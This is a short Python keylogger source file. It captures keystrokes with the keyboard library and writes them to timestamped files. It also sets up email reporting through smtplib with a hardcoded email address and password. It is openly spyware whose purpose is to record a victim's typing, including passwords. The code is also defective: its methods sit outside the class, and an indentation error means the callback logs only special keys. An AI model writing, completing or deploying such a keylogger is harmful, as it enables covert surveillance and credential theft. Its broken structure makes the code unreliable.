import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = 'mateusz.szymkowiak@proton.me'
EMAIL_PASSWORD = 'SoniaDog2137?'


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


def callback(self, event):
    name = event.name
    if len(name) > 1:
        if name == "space":

            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
            self.log += name


def update_filename(self):
    start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
    end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
    self.filename = f"keylog-{start_dt_str}_{end_dt_str}"


def report_to_file(self):
    with open(f"{self.filename}.txt", "w") as f:
        print(self.log, file=f)
    print(f"[+] Saved {self.filename}.txt")